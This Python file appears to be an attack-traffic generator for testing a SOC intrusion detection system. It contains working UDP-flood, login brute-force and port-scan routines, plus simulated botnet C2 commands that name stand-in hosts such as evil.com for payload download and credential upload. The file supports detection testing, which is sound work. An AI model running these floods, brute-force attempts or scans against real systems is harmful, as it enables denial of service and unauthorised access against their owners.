#!/usr/bin/env python3
"""
Attack Traffic Generator for SHIELD SOC Demonstration
Generates various types of attack scenarios for testing the IDS system
"""

import socket
import threading
import time
import random
import struct
import argparse
import logging
import json
from datetime import datetime
from scapy.all import *
import requests
from concurrent.futures import ThreadPoolExecutor
import sys
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class AttackTrafficGenerator:
    """
    Generates various types of attack traffic for testing purposes
    """
    
    def __init__(self, target_ip="127.0.0.1", interface="eth0"):
        self.target_ip = target_ip
        self.interface = interface
        self.is_running = False
        self.attack_stats = {
            'ddos_packets_sent': 0,
            'bruteforce_attempts': 0,
            'malware_requests': 0,
            'botnet_communications': 0,
            'exfiltration_bytes': 0,
            'port_scans_completed': 0
        }
        
    def start_attack_scenario(self, attack_type, duration=60, intensity='medium'):
        """
        Start a specific attack scenario
        """
        self.is_running = True
        logging.info(f"Starting {attack_type} attack scenario for {duration} seconds")
        
        attack_methods = {
            'ddos': self.ddos_attack,
            'bruteforce': self.bruteforce_attack,
            'malware': self.malware_simulation,
            'botnet': self.botnet_communication,
            'exfiltration': self.data_exfiltration,
            'portscan': self.port_scan_attack,
            'mixed': self.mixed_attack_scenario
        }
        
        if attack_type in attack_methods:
            try:
                attack_methods[attack_type](duration, intensity)
            except KeyboardInterrupt:
                logging.info("Attack scenario interrupted by user")
            except Exception as e:
                logging.error(f"Error in attack scenario: {e}")
            finally:
                self.is_running = False
                self.print_attack_stats()
        else:
            logging.error(f"Unknown attack type: {attack_type}")
    
    def ddos_attack(self, duration=60, intensity='medium'):
        """
        Simulate DDoS attack with UDP flood
        """
        intensity_configs = {
            'low': {'threads': 5, 'packets_per_thread': 10, 'delay': 0.1},
            'medium': {'threads': 20, 'packets_per_thread': 50, 'delay': 0.01},
            'high': {'threads': 50, 'packets_per_thread': 100, 'delay': 0.001}
        }
        
        config = intensity_configs.get(intensity, intensity_configs['medium'])
        end_time = time.time() + duration
        
        def send_udp_flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                while time.time() < end_time and self.is_running:
                    for _ in range(config['packets_per_thread']):
                        # Random payload
                        payload = os.urandom(random.randint(64, 1024))
                        target_port = random.randint(1000, 65535)
                        
                        try:
                            sock.sendto(payload, (self.target_ip, target_port))
                            self.attack_stats['ddos_packets_sent'] += 1
                        except Exception:
                            pass  # Ignore connection errors
                    
                    time.sleep(config['delay'])
            finally:
                sock.close()
        
        # Start multiple threads for flood attack
        threads = []
        for _ in range(config['threads']):
            thread = threading.Thread(target=send_udp_flood)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        logging.info(f"DDoS attack completed. Packets sent: {self.attack_stats['ddos_packets_sent']}")
    
    def bruteforce_attack(self, duration=60, intensity='medium'):
        """
        Simulate brute force login attacks
        """
        common_usernames = ['admin', 'root', 'user', 'test', 'guest', 'administrator', 'demo']
        common_passwords = ['password', '123456', 'admin', 'root', 'test', '1234', 'qwerty', 'password123']
        
        intensity_configs = {
            'low': {'delay': 2.0, 'threads': 2},
            'medium': {'delay': 0.5, 'threads': 5},
            'high': {'delay': 0.1, 'threads': 10}
        }
        
        config = intensity_configs.get(intensity, intensity_configs['medium'])
        end_time = time.time() + duration
        
        def attempt_login():
            while time.time() < end_time and self.is_running:
                username = random.choice(common_usernames)
                password = random.choice(common_passwords)
                
                # Simulate HTTP POST login attempt
                login_data = {
                    'username': username,
                    'password': password
                }
                
                try:
                    # Try different common login endpoints
                    endpoints = ['/login', '/admin/login', '/api/auth/login', '/signin']
                    endpoint = random.choice(endpoints)
                    
                    response = requests.post(
                        f"http://{self.target_ip}{endpoint}",
                        data=login_data,
                        timeout=2,
                        headers={'User-Agent': 'Mozilla/5.0 (AttackBot/1.0)'}
                    )
                    
                    self.attack_stats['bruteforce_attempts'] += 1
                    
                except Exception:
                    self.attack_stats['bruteforce_attempts'] += 1
                    pass  # Ignore connection errors
                
                time.sleep(config['delay'])
        
        # Start multiple threads
        threads = []
        for _ in range(config['threads']):
            thread = threading.Thread(target=attempt_login)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        logging.info(f"Brute force attack completed. Attempts: {self.attack_stats['bruteforce_attempts']}")
    
    def malware_simulation(self, duration=60, intensity='medium'):
        """
        Simulate malware-like network behavior
        """
        malicious_domains = [
            'malware-c2.evil.com',
            'botnet.bad.org',
            'trojan.suspicious.net',
            'virus.malicious.io',
            'backdoor.evil.xyz'
        ]
        
        malicious_uris = [
            '/download/payload.exe',
            '/update/bot.dll',
            '/config/settings.dat',
            '/beacon',
            '/upload/stolen.zip'
        ]
        
        intensity_configs = {
            'low': {'requests_per_min': 10},
            'medium': {'requests_per_min': 30},
            'high': {'requests_per_min': 60}
        }
        
        config = intensity_configs.get(intensity, intensity_configs['medium'])
        request_interval = 60.0 / config['requests_per_min']
        end_time = time.time() + duration
        
        while time.time() < end_time and self.is_running:
            domain = random.choice(malicious_domains)
            uri = random.choice(malicious_uris)
            
            # Simulate malware communication patterns
            try:
                # Random malicious payloads
                payload_data = {
                    'bot_id': f'bot_{random.randint(1000, 9999)}',
                    'version': '2.1.3',
                    'status': 'active',
                    'data': os.urandom(random.randint(100, 1000)).hex()
                }
                
                # Different HTTP methods
                method = random.choice(['GET', 'POST', 'PUT'])
                
                if method == 'GET':
                    requests.get(
                        f"http://{self.target_ip}{uri}",
                        params=payload_data,
                        timeout=2,
                        headers={
                            'User-Agent': 'MalwareBot/2.1',
                            'X-Bot-ID': payload_data['bot_id']
                        }
                    )
                else:
                    requests.post(
                        f"http://{self.target_ip}{uri}",
                        json=payload_data,
                        timeout=2,
                        headers={
                            'User-Agent': 'MalwareBot/2.1',
                            'Content-Type': 'application/json'
                        }
                    )
                
                self.attack_stats['malware_requests'] += 1
                
            except Exception:
                self.attack_stats['malware_requests'] += 1
                pass
            
            time.sleep(request_interval)
        
        logging.info(f"Malware simulation completed. Requests: {self.attack_stats['malware_requests']}")
    
    def botnet_communication(self, duration=60, intensity='medium'):
        """
        Simulate botnet command and control communication
        """
        c2_commands = [
            {'cmd': 'update', 'args': {'version': '2.1.4', 'url': 'http://evil.com/bot.exe'}},
            {'cmd': 'attack', 'args': {'target': '192.168.1.100', 'type': 'ddos', 'duration': 300}},
            {'cmd': 'steal', 'args': {'type': 'credentials', 'upload_url': 'http://evil.com/upload'}},
            {'cmd': 'beacon', 'args': {'interval': 30}},
            {'cmd': 'download', 'args': {'url': 'http://evil.com/payload.dll', 'exec': True}}
        ]
        
        intensity_configs = {
            'low': {'beacon_interval': 30},
            'medium': {'beacon_interval': 15},
            'high': {'beacon_interval': 5}
        }
        
        config = intensity_configs.get(intensity, intensity_configs['medium'])
        end_time = time.time() + duration
        
        bot_id = f"bot_{random.randint(10000, 99999)}"
        
        while time.time() < end_time and self.is_running:
            # Send beacon
            beacon_data = {
                'bot_id': bot_id,
                'timestamp': datetime.now().isoformat(),
                'ip': self.get_local_ip(),
                'status': 'online',
                'capabilities': ['ddos', 'keylog', 'screenshot', 'download']
            }
            
            try:
                # Beacon to C2
                requests.post(
                    f"http://{self.target_ip}/c2/beacon",
                    json=beacon_data,
                    timeout=3,
                    headers={
                        'User-Agent': f'Bot/{bot_id}',
                        'X-Bot-Version': '2.1.3'
                    }
                )
                
                # Request commands
                response = requests.get(
                    f"http://{self.target_ip}/c2/commands",
                    params={'bot_id': bot_id},
                    timeout=3
                )
                
                # Simulate command execution
                if random.random() < 0.3:  # 30% chance of receiving command
                    command = random.choice(c2_commands)
                    
                    # Send command acknowledgment
                    requests.post(
                        f"http://{self.target_ip}/c2/ack",
                        json={
                            'bot_id': bot_id,
                            'command_id': random.randint(1000, 9999),
                            'command': command['cmd'],
                            'status': 'executed',
                            'result': 'success'
                        },
                        timeout=3
                    )
                
                self.attack_stats['botnet_communications'] += 1
                
            except Exception:
                self.attack_stats['botnet_communications'] += 1
                pass
            
            time.sleep(config['beacon_interval'])
        
        logging.info(f"Botnet simulation completed. Communications: {self.attack_stats['botnet_communications']}")
    
    def data_exfiltration(self, duration=60, intensity='medium'):
        """
        Simulate data exfiltration patterns
        """
        intensity_configs = {
            'low': {'chunk_size': 1024, 'interval': 5},
            'medium': {'chunk_size': 10240, 'interval': 2},
            'high': {'chunk_size': 102400, 'interval': 0.5}
        }
        
        config = intensity_configs.get(intensity, intensity_configs['medium'])
        end_time = time.time() + duration
        
        # Simulate different types of sensitive data
        data_types = [
            {'type': 'credentials', 'pattern': 'username:password'},
            {'type': 'credit_cards', 'pattern': '4532-1234-5678-9012'},
            {'type': 'ssn', 'pattern': '123-45-6789'},
            {'type': 'database', 'pattern': 'SELECT * FROM users'},
            {'type': 'files', 'pattern': 'C:\\sensitive\\document.pdf'}
        ]
        
        while time.time() < end_time and self.is_running:
            # Generate fake sensitive data
            data_type = random.choice(data_types)
            
            # Create data chunk
            fake_data = []
            for _ in range(random.randint(10, 100)):
                if data_type['type'] == 'credentials':
                    fake_data.append(f"user{random.randint(1, 1000)}:pass{random.randint(1, 1000)}")
                elif data_type['type'] == 'credit_cards':
                    fake_data.append(f"4532-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}")
                else:
                    fake_data.append(data_type['pattern'] + f"_{random.randint(1, 1000)}")
            
            # Encode data
            data_chunk = '\n'.join(fake_data).encode('utf-8')
            
            # Pad to desired chunk size
            if len(data_chunk) < config['chunk_size']:
                padding = os.urandom(config['chunk_size'] - len(data_chunk))
                data_chunk += padding
            else:
                data_chunk = data_chunk[:config['chunk_size']]
            
            try:
                # Exfiltrate via HTTP POST
                files = {'data': ('stolen_data.txt', data_chunk, 'application/octet-stream')}
                
                requests.post(
                    f"http://{self.target_ip}/upload/exfil",
                    files=files,
                    data={
                        'type': data_type['type'],
                        'size': len(data_chunk),
                        'timestamp': datetime.now().isoformat()
                    },
                    timeout=5,
                    headers={'User-Agent': 'DataExfilBot/1.0'}
                )
                
                self.attack_stats['exfiltration_bytes'] += len(data_chunk)
                
            except Exception:
                self.attack_stats['exfiltration_bytes'] += len(data_chunk)
                pass
            
            time.sleep(config['interval'])
        
        logging.info(f"Data exfiltration completed. Bytes: {self.attack_stats['exfiltration_bytes']}")
    
    def port_scan_attack(self, duration=60, intensity='medium'):
        """
        Simulate port scanning activity
        """
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        
        intensity_configs = {
            'low': {'ports_per_scan': 10, 'scan_delay': 1.0},
            'medium': {'ports_per_scan': 50, 'scan_delay': 0.1},
            'high': {'ports_per_scan': 100, 'scan_delay': 0.01}
        }
        
        config = intensity_configs.get(intensity, intensity_configs['medium'])
        end_time = time.time() + duration
        
        def scan_port(target_ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                return port, result == 0
            except:
                return port, False
        
        scan_count = 0
        while time.time() < end_time and self.is_running:
            # Select ports to scan
            ports_to_scan = random.sample(common_ports, min(config['ports_per_scan'], len(common_ports)))
            
            # Parallel port scanning
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(scan_port, self.target_ip, port) for port in ports_to_scan]
                
                open_ports = []
                for future in futures:
                    try:
                        port, is_open = future.result(timeout=1)
                        if is_open:
                            open_ports.append(port)
                    except:
                        pass
            
            scan_count += 1
            self.attack_stats['port_scans_completed'] = scan_count
            
            if open_ports:
                logging.info(f"Port scan {scan_count}: Found open ports {open_ports}")
            
            time.sleep(config['scan_delay'])
        
        logging.info(f"Port scanning completed. Scans: {self.attack_stats['port_scans_completed']}")
    
    def mixed_attack_scenario(self, duration=60, intensity='medium'):
        """
        Run multiple attack types simultaneously
        """
        logging.info("Starting mixed attack scenario")
        
        # Define attack mix
        attack_threads = []
        
        # Start different attacks with shorter durations
        individual_duration = duration // 3
        
        attacks = [
            ('ddos', individual_duration, intensity),
            ('bruteforce', duration, 'low'),  # Run throughout
            ('malware', duration // 2, intensity),
            ('botnet', duration, 'low'),  # Run throughout
            ('portscan', individual_duration, intensity)
        ]
        
        for attack_type, attack_duration, attack_intensity in attacks:
            if attack_type == 'ddos':
                thread = threading.Thread(target=self.ddos_attack, args=(attack_duration, attack_intensity))
            elif attack_type == 'bruteforce':
                thread = threading.Thread(target=self.bruteforce_attack, args=(attack_duration, attack_intensity))
            elif attack_type == 'malware':
                thread = threading.Thread(target=self.malware_simulation, args=(attack_duration, attack_intensity))
            elif attack_type == 'botnet':
                thread = threading.Thread(target=self.botnet_communication, args=(attack_duration, attack_intensity))
            elif attack_type == 'portscan':
                thread = threading.Thread(target=self.port_scan_attack, args=(attack_duration, attack_intensity))
            
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
            
            # Stagger attack starts
            time.sleep(5)
        
        # Wait for all attacks to complete
        for thread in attack_threads:
            thread.join()
        
        logging.info("Mixed attack scenario completed")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            local_ip = sock.getsockname()[0]
            sock.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def print_attack_stats(self):
        """Print attack statistics"""
        logging.info("Attack Statistics:")
        logging.info(f"  DDoS packets sent: {self.attack_stats['ddos_packets_sent']}")
        logging.info(f"  Brute force attempts: {self.attack_stats['bruteforce_attempts']}")
        logging.info(f"  Malware requests: {self.attack_stats['malware_requests']}")
        logging.info(f"  Botnet communications: {self.attack_stats['botnet_communications']}")
        logging.info(f"  Data exfiltrated: {self.attack_stats['exfiltration_bytes']} bytes")
        logging.info(f"  Port scans completed: {self.attack_stats['port_scans_completed']}")
    
    def save_attack_log(self, filename):
        """Save attack statistics to file"""
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'target_ip': self.target_ip,
            'statistics': self.attack_stats
        }
        
        with open(filename, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        logging.info(f"Attack log saved to {filename}")


def main():
    parser = argparse.ArgumentParser(description='Attack Traffic Generator for SHIELD SOC')
    parser.add_argument('--target', '-t', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--attack', '-a', required=True,
                        choices=['ddos', 'bruteforce', 'malware', 'botnet', 'exfiltration', 'portscan', 'mixed'],
                        help='Attack type to simulate')
    parser.add_argument('--duration', '-d', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--intensity', '-i', choices=['low', 'medium', 'high'], default='medium',
                        help='Attack intensity level')
    parser.add_argument('--interface', default='eth0', help='Network interface')
    parser.add_argument('--log', '-l', help='Save attack log to file')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Warning message
    print("=" * 60)
    print("ATTACK TRAFFIC GENERATOR - FOR TESTING PURPOSES ONLY")
    print("=" * 60)
    print(f"Target: {args.target}")
    print(f"Attack Type: {args.attack}")
    print(f"Duration: {args.duration} seconds")
    print(f"Intensity: {args.intensity}")
    print()
    print("WARNING: This tool generates malicious traffic patterns.")
    print("Only use against systems you own or have permission to test.")
    print("=" * 60)
    
    # Confirmation
    if not args.target == '127.0.0.1':
        confirm = input("Are you sure you want to proceed? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Attack cancelled.")
            sys.exit(0)
    
    # Create generator
    generator = AttackTrafficGenerator(target_ip=args.target, interface=args.interface)
    
    try:
        # Start attack scenario
        generator.start_attack_scenario(args.attack, args.duration, args.intensity)
        
        # Save log if requested
        if args.log:
            generator.save_attack_log(args.log)
            
    except KeyboardInterrupt:
        logging.info("Attack generation interrupted by user")
        generator.is_running = False
    except Exception as e:
        logging.error(f"Error in attack generation: {e}")
    finally:
        print("\nAttack generation completed.")


if __name__ == "__main__":
    main()